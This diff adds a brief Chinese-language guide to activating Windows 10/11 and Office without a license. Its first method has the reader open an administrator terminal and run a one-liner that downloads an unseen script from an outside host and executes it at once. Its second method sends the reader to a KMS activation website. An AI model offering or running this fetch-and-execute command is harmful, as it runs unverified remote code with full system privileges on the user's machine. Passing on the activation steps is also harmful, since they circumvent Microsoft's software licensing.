@@ -1,0 +1,9 @@
+激活Windows 10/11, Office的方法
+
+方法一
+1. 以管理员模式打开Windows终端
+2. 在终端输入：irm win.zyqq.top | iex
+
+方法二
+1. 打开网站kms.cx
+2. 按网站提示操作
